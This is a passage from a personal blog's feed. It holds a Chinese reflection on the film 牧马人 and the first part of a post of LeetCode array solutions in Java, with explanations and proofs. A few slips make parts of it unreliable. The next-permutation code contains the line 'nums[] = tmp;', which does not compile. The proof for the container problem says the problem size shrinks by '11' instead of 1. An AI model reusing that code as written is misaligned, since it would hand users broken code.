    <link href="http://lishuaiyun.cn/2021/03/14/%E7%89%A7%E9%A9%AC%E4%BA%BA/"/>
    <id>http://lishuaiyun.cn/2021/03/14/%E7%89%A7%E9%A9%AC%E4%BA%BA/</id>
    <published>2021-03-14T10:43:07.000Z</published>
    <updated>2022-03-26T12:12:26.431Z</updated>
    
    <content type="html"><![CDATA[<p>&emsp;&emsp;今天在b站刷到了一部老电影的剪辑，很温暖，很朴实，我忍不住去看了原版，电影的名字叫做牧马人。</p><p>&emsp;&emsp;那个年代的人真的很淳朴，许灵均因为自己的条件感到自卑不愿意耽误秀芝，但却把全身家当给了秀芝让她回家。秀芝也深深的明白灵均的好，不因为他右派的帽子而嫌弃他，不因为社会风气的影响相信自己的眼光，这是秀芝的纯与真。以下是秀芝的话：</p><p>&emsp;&emsp;在灵均去北京见亿万家财的父亲时，秀芝对乡亲们说：“在我眼里，他还是许灵均，他就是当上官儿，我也不稀罕，再放二十年马，我也不嫌弃。反正，结婚的那天起，我就给他改正了，不是现在。”</p><p>&emsp;&emsp;”你改正也不能给他补五百块钱哪“</p><p>&emsp;&emsp;”我把心都扒给他了，比钱贵重得多“</p><p>&emsp;&emsp;秀芝这样教育孩子：”钱，只有咱们自己挣来的，花得才有意思，才心里安闲。像我买盐，我知道这是我卖鸡蛋换来的呀！对不对？我买辣子，我知道那是我割稻子赚来的。我给你买小人书，我知道这是我加班打场得来的钱啊。不是我们自己的钱，一个也不要。这叫志气。”</p><p>&emsp;&emsp;秀芝对灵均说：””我知道，你舍不得学校里的孩子们、舍不得老乡们、舍不得这个家，还有你也舍不得她。你可以把她装进口袋里带走，可那是空的，祁连山你背不走，大草原你也背不走。我们家乡有句老话，子不嫌母丑，狗不嫌家贫。”</p><p>&emsp;&emsp;灵均放弃了美国的亿万家财，在北京的高级百货商店里，许景由买了两个八百块的精美瓷器，灵均买了4块5的泡菜坛子，因为秀芝喜欢吃泡菜。</p><p>&emsp;&emsp;平凡真好，爱情真好。</p><p>&emsp;&emsp;从前书信很慢，车马很远，一生只爱一个人。</p>]]></content>
    
    
    <summary type="html">从前书信很慢，车马很远，一生只爱一个人。</summary>
    
    
    
    <category term="生活" scheme="http://lishuaiyun.cn/categories/%E7%94%9F%E6%B4%BB/"/>
    
    
    <category term="爱情" scheme="http://lishuaiyun.cn/tags/%E7%88%B1%E6%83%85/"/>
    
    <category term="电影分享" scheme="http://lishuaiyun.cn/tags/%E7%94%B5%E5%BD%B1%E5%88%86%E4%BA%AB/"/>
    
  </entry>
  
  <entry>
    <title>TOP100</title>
    <link href="http://lishuaiyun.cn/2021/03/13/TOP100/"/>
    <id>http://lishuaiyun.cn/2021/03/13/TOP100/</id>
    <published>2021-03-13T10:32:02.000Z</published>
    <updated>2022-03-26T13:14:44.614Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-数组"><a href="#1-数组" class="headerlink" title="1. 数组"></a>1. 数组</h1><h2 id="1-1-两数之和"><a href="#1-1-两数之和" class="headerlink" title="1.1 两数之和"></a>1.1 两数之和</h2><p>与剑指offer和为s的两个数字不同的是给定的整型数组不是有序的，这里遍历每个数的同时查找$target-nums[i]$是否存在，使用hashmap存储结果。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] twoSum(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> target) &#123;</span><br><span class="line">    Map&lt;Integer,Integer&gt; map = <span class="keyword">new</span> HashMap&lt;Integer,Integer&gt;();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.length; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(map.containsKey(target - nums[i]))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;i,map.get(target - nums[i])&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        map.put(nums[i],i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="1-2-多数元素"><a href="#1-2-多数元素" class="headerlink" title="1.2 多数元素"></a>1.2 多数元素</h2><p>同剑指offer 数组中出现次数超过一半的数字</p><p>摩尔投票法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">majorityElement</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line"><span class="comment">//x众数,votes票数</span></span><br><span class="line">    <span class="keyword">int</span> x = <span class="number">0</span>, votes = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> num : nums)&#123;</span><br><span class="line">        <span class="keyword">if</span> (votes == <span class="number">0</span>)&#123;x = num;&#125;</span><br><span class="line">        votes += num == x ? <span class="number">1</span> : -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="1-3-移动零"><a href="#1-3-移动零" class="headerlink" title="1.3 移动零"></a>1.3 移动零</h2><p>将非0元素填充在首部，剩余元素用0填充</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">moveZeroes</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n = nums.length;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>,j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(nums[i] != <span class="number">0</span>)&#123;</span><br><span class="line">            nums[j++] = nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(j &lt; n)&#123;</span><br><span class="line">        nums[j++] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="1-4-找到所有数组中消失的数字"><a href="#1-4-找到所有数组中消失的数字" class="headerlink" title="1.4 找到所有数组中消失的数字"></a>1.4 找到所有数组中消失的数字</h2><p>我们可以用一个哈希表记录数组 $\textit{nums}$ 中的数字，由于数字范围均在$ [1,n]$ 中，记录数字后我们再利用哈希表检查 $[1,n] $中的每一个数是否出现，从而找到缺失的数字。</p><p>由于数字范围均在 $[1,n]$ 中，我们也可以用一个长度为 n 的数组来代替哈希表。这一做法的空间复杂度是 O(n) 的。我们的目标是优化空间复杂度到 O(1)。</p><p>注意到 $\textit{nums} $的长度恰好也为 n，能否让 $\textit{nums}$ 充当哈希表呢？</p><p>由于 $\textit{nums}$ 的数字范围均在$ [1,n]$ 中，我们可以利用这一范围之外的数字，来表达「是否存在」的含义。</p><p>具体来说，遍历 $\textit{nums}$，每遇到一个数 x，就让 $\textit{nums}[x-1]$ 增加 n。由于 $\textit{nums}$ 中所有数均在 $[1,n]$ 中，增加以后，这些数必然大于 n。最后我们遍历 $\textit{nums}$，若 $\textit{nums}[i]$ 未大于 n，就说明没有遇到过数 i+1。这样我们就找到了缺失的数字。</p><p>注意，当我们遍历到某个位置时，其中的数可能已经被增加过，因此需要对 n取模来还原出它本来的值。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">findDisappearedNumbers</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n = nums.length;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> num : nums)&#123;</span><br><span class="line">        <span class="keyword">int</span> x = (num - <span class="number">1</span>) % n;</span><br><span class="line">        nums[x] += n;</span><br><span class="line">    &#125;</span><br><span class="line">    List&lt;Integer&gt; res = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(nums[i] &lt;= n)&#123;</span><br><span class="line">            res.add(i + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="1-5-盛最多水的容器"><a href="#1-5-盛最多水的容器" class="headerlink" title="1.5 盛最多水的容器"></a>1.5 盛最多水的容器</h2><p>暴力解</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxArea</span><span class="params">(<span class="keyword">int</span>[] height)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> m = <span class="number">0</span>, n = height.length;</span><br><span class="line">    <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n - <span class="number">1</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = i + <span class="number">1</span>; j &lt; n; j++)&#123;</span><br><span class="line">            res = Math.max(res,(j - i) * Math.min(height[i],height[j]));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>双指针</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxArea</span><span class="params">(<span class="keyword">int</span>[] height)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>,j = height.length - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(i &lt; j)&#123;</span><br><span class="line">        res = Math.max(res,(j - i) * Math.min(height[i],height[j]));</span><br><span class="line">        <span class="keyword">if</span>(height[i] &lt; height[j])&#123;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            j--;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>移动数字较小指针的正确性证明：</p><blockquote><p>双指针代表了什么？</p></blockquote><p>双指针代表的是 可以作为容器边界的所有位置的范围。在一开始，双指针指向数组的左右边界，表示 数组中所有的位置都可以作为容器的边界，因为我们还没有进行过任何尝试。在这之后，我们每次将 对应的数字较小的那个指针 往 另一个指针 的方向移动一个位置，就表示我们认为 这个指针不可能再作为容器的边界了。</p><blockquote><p>为什么对应的数字较小的那个指针不可能再作为容器的边界了？</p></blockquote><p>在上面的分析部分，我们对这个问题有了一点初步的想法。这里我们定量地进行证明。</p><p>考虑第一步，假设当前左指针和右指针指向的数分别为 x 和 y，不失一般性，我们假设 $x \leq y$。同时，两个指针之间的距离为 t。那么，它们组成的容器的容量为：</p><script type="math/tex; mode=display">\min(x, y) * t = x * t</script><p>我们可以断定，如果我们保持左指针的位置不变，那么无论右指针在哪里，这个容器的容量都不会超过 $x * t$了。注意这里右指针只能向左移动，因为 我们考虑的是第一步，也就是 指针还指向数组的左右边界的时候。</p><p>我们任意向左移动右指针，指向的数为$ y_1$ ，两个指针之间的距离为 $t_1$ ，那么显然有 $t_1 &lt; t$，并且 $\min(x, y_1) \leq \min(x, y)$ )：</p><ul><li><p>如果 $y_1 \leq y$，那么 $\min(x, y_1) \leq \min(x, y)$；</p></li><li><p>如果 $y_1 &gt; y$ 那么 $\min(x, y_1) = x = \min(x, y)$。</p></li></ul><p>因此有：</p><script type="math/tex; mode=display">\min(x, y_t) * t_1 < \min(x, y) * t</script><p>即无论我们怎么移动右指针，得到的容器的容量都小于移动前容器的容量。也就是说，这个左指针对应的数不会作为容器的边界了，那么我们就可以丢弃这个位置，将左指针向右移动一个位置，此时新的左指针于原先的右指针之间的左右位置，才可能会作为容器的边界。</p><p>这样以来，我们将问题的规模减小了 11，被我们丢弃的那个位置就相当于消失了。此时的左右指针，就指向了一个新的、规模减少了的问题的数组的左右边界，因此，我们可以继续像之前 考虑第一步 那样考虑这个问题：</p><ul><li><p>求出当前双指针对应的容器的容量；</p></li><li><p>对应数字较小的那个指针以后不可能作为容器的边界了，将其丢弃，并移动对应的指针。</p></li></ul><blockquote><p>最后的答案是什么？</p></blockquote><p>答案就是我们每次以双指针为左右边界（也就是「数组」的左右边界）计算出的容量中的最大值。</p><h2 id="1-6-三数之和"><a href="#1-6-三数之和" class="headerlink" title="1.6 三数之和"></a>1.6 三数之和</h2><p>排序+双指针</p><p>暴力解法$O(n^3)$，先排序，固定一个数字，剩下两个数字用剑指offer和为s的两个数字的双指针解法移动，注意排除重复元素并添加优化细节。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; threeSum(<span class="keyword">int</span>[] nums) &#123;</span><br><span class="line">     Arrays.sort(nums);</span><br><span class="line">     <span class="keyword">int</span> n = nums.length;</span><br><span class="line">     List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">     <span class="keyword">for</span>(<span class="keyword">int</span> m = <span class="number">0</span>; m &lt; n - <span class="number">2</span>; m++)&#123;</span><br><span class="line">         <span class="comment">//因为已经排序，最小数字&gt;0则无须继续遍历</span></span><br><span class="line">         <span class="keyword">if</span>(nums[m] &gt; <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">         <span class="comment">//如果当前固定数字和前一个相同，排除重复答案</span></span><br><span class="line">         <span class="keyword">if</span>(m &gt; <span class="number">0</span> &amp;&amp; nums[m] == nums[m - <span class="number">1</span>]) <span class="keyword">continue</span>;</span><br><span class="line">         <span class="keyword">int</span> i = m + <span class="number">1</span>, j = n - <span class="number">1</span>;</span><br><span class="line">         <span class="keyword">while</span>(i &lt; j)&#123;</span><br><span class="line">             <span class="keyword">int</span> s = nums[m] + nums[i] + nums[j]; </span><br><span class="line">             <span class="keyword">if</span>(s &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                 <span class="comment">//j不满足条件，将nums[j]相等元素排除</span></span><br><span class="line">                 <span class="keyword">while</span>(i &lt; j &amp;&amp; nums[j] == nums[--j]);</span><br><span class="line">             &#125;<span class="keyword">else</span> <span class="keyword">if</span>(s &lt; <span class="number">0</span>)&#123;</span><br><span class="line">                 <span class="comment">//i不满足条件，将nums[i]相等元素排除</span></span><br><span class="line">                 <span class="keyword">while</span>(i &lt; j &amp;&amp; nums[i] == nums[++i]);</span><br><span class="line">             &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                 res.add(<span class="keyword">new</span> ArrayList&lt;Integer&gt;(Arrays.asList(nums[m], nums[i], nums[j])));</span><br><span class="line">                 <span class="comment">//排除重复答案</span></span><br><span class="line">                 <span class="keyword">while</span>(i &lt; j &amp;&amp; nums[i] == nums[++i]);</span><br><span class="line">                 <span class="keyword">while</span>(i &lt; j &amp;&amp; nums[j] == nums[--j]);</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> res;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h2 id="1-7-下一个排列"><a href="#1-7-下一个排列" class="headerlink" title="1.7 下一个排列"></a>1.7 下一个排列</h2><ul><li>从后到前找升序对$nums(j - 1),nums(j)$</li><li>将$nums[j - 1]$和后面大于$nums[j - 1]$的最小数交换，并将$nums[j]$后面的数字排序</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">nextPermutation</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n = nums.length;</span><br><span class="line">    <span class="keyword">boolean</span> flag = <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j = n - <span class="number">1</span>; j &gt; <span class="number">0</span>; j--)&#123;</span><br><span class="line">        <span class="keyword">if</span>(nums[j - <span class="number">1</span>] &lt; nums[j])&#123;</span><br><span class="line">            Arrays.sort(nums,j, n);</span><br><span class="line">            <span class="comment">//找排序后第一个比nums[j - 1]大的数(尽量小的大数)</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> k = j; k &lt; n; k++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(nums[k] &gt; nums[j - <span class="number">1</span>])&#123;</span><br><span class="line">                    <span class="keyword">int</span> tmp = nums[j - <span class="number">1</span>];</span><br><span class="line">                    nums[j - <span class="number">1</span>] = nums[k];</span><br><span class="line">                    nums[] = tmp;</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">    Arrays.sort(nums);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="1-8-搜索旋转排序数组"><a href="#1-8-搜索旋转排序数组" class="headerlink" title="1.8 搜索旋转排序数组"></a>1.8 搜索旋转排序数组</h2><p>有序数组使用二分法解决</p><p>​        可以发现的是，我们将数组从中间分开成左右两部分的时候，一定有一部分的数组是有序的。</p><p>​        这启示我们可以在常规二分查找的时候查看当前 mid 为分割位置分割出来的两个部分 [l, mid] 和 [mid + 1, r] 哪个部分是有序的，并根据有序的那个部分确定我们该如何改变二分查找的上下界，因为我们能够根据有序的那部分判断出 target 在不在这个部分：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">search</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n = nums.length;</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> nums[<span class="number">0</span>] == target ? <span class="number">0</span> : -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>, j = nums.length - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> mid = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(i &lt;= j)&#123;</span><br><span class="line">        mid = i + (j - i) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(nums[mid] == target)&#123;</span><br><span class="line">            <span class="keyword">return</span> mid;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//左侧顺序</span></span><br><span class="line">        <span class="keyword">if</span>(nums[mid] &gt;= nums[<span class="number">0</span>])&#123;</span><br><span class="line">            <span class="comment">//目标在左侧</span></span><br><span class="line">            <span class="keyword">if</span>(nums[<span class="number">0</span>] &lt;= target &amp;&amp; target &lt;= nums[mid])&#123;</span><br><span class="line">                j = mid - <span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                i = mid + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">//右侧顺序</span></span><br><span class="line">            <span class="comment">//目标在右侧</span></span><br><span class="line">            <span class="keyword">if</span>(nums[j] &gt;= target &amp;&amp; target &gt;= nums[mid])&#123;</span><br><span class="line">                i = mid + <span class="number">1</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                j = mid - <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="1-9-旋转图像"><a href="#1-9-旋转图像" class="headerlink" title="1.9 旋转图像"></a>1.9 旋转图像</h2><p>对于矩阵中第 $i$ 行的第 $j$ 个元素，在旋转后，它出现在倒数第 $i$ 列的第 $j$ 个位置。</p><p>我们得到：</p><script type="math/tex; mode=display">\left\{\begin{aligned}&temp=matrix[n−col−1][row] \\&matrix[n−col−1][row]=matrix[n−row−1][n−col−1] \\&matrix[n−row−1][n−col−1]=matrix[col][n−row−1] \\&matrix[col][n−row−1]=matrix[row][col]\end{aligned}\right.</script><p>当我们知道了如何原地旋转矩阵之后，还有一个重要的问题在于：我们应该枚举哪些位置$ (\textit{row}, \textit{col})$\ 进行上述的原地交换操作呢？由于每一次原地交换四个位置，因此：</p><ul><li>当 n 为偶数时，我们需要枚举 $n^2 / 4 = (n/2) \times (n/2)$个位置，可以将该图形分为四块，以 $4×4 $的矩阵为例：</li><li><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/旋转图像1.png" alt="旋转图像1" style="zoom: 33%;" /></li></ul><p>保证了不重复、不遗漏；</p><p>当 n为奇数时，由于中心的位置经过旋转后位置不变，我们需要枚举$ (n^2-1) / 4 = ((n-1)/2) \times ((n+1)/2)$个位置，需要换一种划分的方式，以 $5×5$ 的矩阵为例：</p><p><img src="http://hexo-bolg-image.oss-cn-beijing.aliyuncs.com/img/旋转图像2.png" alt="旋转图像2" style="zoom: 33%;" /></p><p>同样保证了不重复、不遗漏，矩阵正中央的点无需旋转。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">rotate</span><span class="params">(<span class="keyword">int</span>[][] matrix)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n = matrix.length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n / <span class="number">2</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; (n + <span class="number">1</span>) / <span class="number">2</span>; ++j) &#123;</span><br><span class="line">            <span class="keyword">int</span> temp = matrix[i][j];</span><br><span class="line">            matrix[i][j] = matrix[n - j - <span class="number">1</span>][i];</span><br><span class="line">            matrix[n - j - <span class="number">1</span>][i] = matrix[n - i - <span class="number">1</span>][n - j - <span class="number">1</span>];</span><br><span class="line">            matrix[n - i - <span class="number">1</span>][n - j - <span class="number">1</span>] = matrix[j][n - i - <span class="number">1</span>];</span><br><span class="line">            matrix[j][n - i - <span class="number">1</span>] = temp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="1-10-合并区间"><a href="#1-10-合并区间" class="headerlink" title="1.10 合并区间"></a>1.10 合并区间</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[][] merge(<span class="keyword">int</span>[][] intervals) &#123;</span><br><span class="line">    <span class="comment">// 按 start 升序排序</span></span><br><span class="line">    Arrays.sort(intervals, (<span class="keyword">int</span>[] a, <span class="keyword">int</span>[] b) -&gt; &#123;</span><br><span class="line">            <span class="keyword">return</span> a[<span class="number">0</span>] - b[<span class="number">0</span>];</span><br><span class="line">    &#125;);</span><br><span class="line">    List&lt;<span class="keyword">int</span>[]&gt; merged = <span class="keyword">new</span> ArrayList&lt;<span class="keyword">int</span>[]&gt;();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; intervals.length; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> L = intervals[i][<span class="number">0</span>], R = intervals[i][<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">if</span> (merged.size() == <span class="number">0</span> || merged.get(merged.size() - <span class="number">1</span>)[<span class="number">1</span>] &lt; L) &#123;</span><br><span class="line">            <span class="comment">//结果集为空或与当前区间没有交集</span></span><br><span class="line">            merged.add(<span class="keyword">new</span> <span class="keyword">int</span>[]&#123;L, R&#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//合并区间</span></span><br><span class="line">            merged.get(merged.size() - <span class="number">1</span>)[<span class="number">1</span>] = Math.max(merged.get(merged.size() - <span class="number">1</span>)[<span class="number">1</span>], R);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> merged.toArray(<span class="keyword">new</span> <span class="keyword">int</span>[merged.size()][]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="1-11-颜色分类"><a href="#1-11-颜色分类" class="headerlink" title="1.11 颜色分类"></a>1.11 颜色分类</h2><p>这是一道排序题，题目要求是使用常数空间的一趟扫描算法。</p><p>使用常数空间意味着原地排序，通过比较和交换进行数据排序，即空间复杂度O(1)，时间复杂度O(n)。</p><div 